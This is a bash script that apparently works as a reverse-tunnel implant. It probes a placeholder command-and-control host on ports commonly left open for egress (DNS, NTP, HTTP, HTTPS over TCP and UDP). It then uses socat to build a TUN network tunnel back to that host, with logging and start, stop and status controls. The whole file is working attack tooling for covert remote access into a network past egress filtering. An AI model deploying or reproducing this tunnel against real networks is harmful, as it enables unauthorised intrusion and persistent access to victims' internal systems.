#!/bin/bash
#set -x 
#-- Config Variables
INTERFACE='eth0' # Interface which device will use
LOGFILE='/var/log/reverse/reverse.log'
C2='ipAddress_From_Command&Control'
#--

function checkIface(){
  checkLink=$(ethtool $INTERFACE | grep -i detected | cut -d ':' -f 2 | tr -d  ' ')
  if [ ! -z $checkLink ] && [[ $checkLink == 'yes' ]]
  then
   return 0
  else
   return 1
  fi	
}

function getIP(){
  IP=$(ifconfig eth0 | grep -i inet  | head -n1 | tr -s ' ' | cut -d ' ' -f 3)
  mask=$(ifconfig eth0 | grep -i inet  | head -n1 | tr -s ' ' | cut -d ' ' -f 5)
  broadcast=$(ifconfig eth0 | grep -i inet  | head -n1 | tr -s ' ' | cut -d ' ' -f 7)
  gateway=$(ip route show | grep -i default | cut -d ' ' -f 3) 
  echo "[+] IPv4: $IP Mask: $mask BroadCast: $broadcast Gateway: $gateway" | tee -a $LOGFILE
}
function checkSocat(){
  bin=$(whereis socat  | cut -d ':' -f 2 | cut -d ' ' -f 2)
  if [ ! -z $bin ] && [ -f $bin ];then
    version=$(socat -V | grep -i version | head -n1  | cut -d ' ' -f 3)
    echo "[-] Socat located at $bin and version is $version" | tee -a $LOGFILE
  else
    echo "[!] There's a problem with socat, please check. I'm leaving right now"
    exit 1
  fi
}

function checkCon(){
  ifacesNum=$(ifconfig  |grep -i tun | wc -l)
  if [ $ifacesNum -ge 1 ];then
      return 0
    else 
      return 1
    fi
}

function connect(){
  PROTO=$1
  C2=$2
  PORT=$3
  socat $PROTO:$C2:$PORT TUN:192.168.255.2/24,up &>/dev/null & 
}
function revCon(){
  checkSocat
  ports_TCP="53 123 80 443"
  for port in $ports_TCP;do
    if [[ `nc -zt $C2 $port ; echo $?` == 0  ]]; then 
      echo "[+] TCP Port $port Reacheable" | tee -a $LOGFILE
      if [[ `checkCon;echo $?` == 1 ]];then
        connect TCP $C2 $port
	return 0
      else 
	echo '[+] Already connected'
      fi
    fi
  done

  ports_UDP='53 123'
  for port in $ports_UDP;do
    if [[ `nc -vzu $C2 $port 2>/dev/null ; echo $?` == 0  ]]; then 
      echo "[+] UDP Port $port Reacheable" | tee -a $LOGFILE
      if [[ `checkCon;echo $?` == 1 ]];then
        connect UDP $C2 $port
	return 0 
      else 
	echo '[+] Already connected'
      fi
      fi
  done
}


function start_prog(){
  echo "[-] Starting at `date +%D_%T`" | tee -a $LOGFILE
  if [[ `checkIface; echo $?` ==  0 ]]
  then
     echo "[+] Link at $INTERFACE is up." | tee -a $LOGFILE
     getIP
     revCon
  else
     echo "[!] Link at $INTERFACE is down." | tee -a $LOGFILE
  fi
}

function stop_prog(){
  echo "[-] Stoping  at `date +%D_%T`" | tee -a $LOGFILE
   for pid in $(getPID | tail -n +1 | cut -d ' ' -f 2);
   do  
    echo "[-] Killing Process: $pid"
    kill -s SIGTERM $pid
  done

}

function getPID(){
	  ps -C socat| grep -v PID
  }


function status_prog(){
  echo "[+] Processos:"
   getPID
   echo "[+] Interface:"
   for i in `seq 0 $(ifconfig | grep -i tun | wc -l)`;do
	ifconfig tun$i 2>/dev/null
done

}

function usage(){
  echo "[-] Help menu or whatever"
}

case $1 in 
  "start") start_prog ;;
  'stop' ) stop_prog ;;
  'status') status_prog ;; 
  *) usage;;
esac 

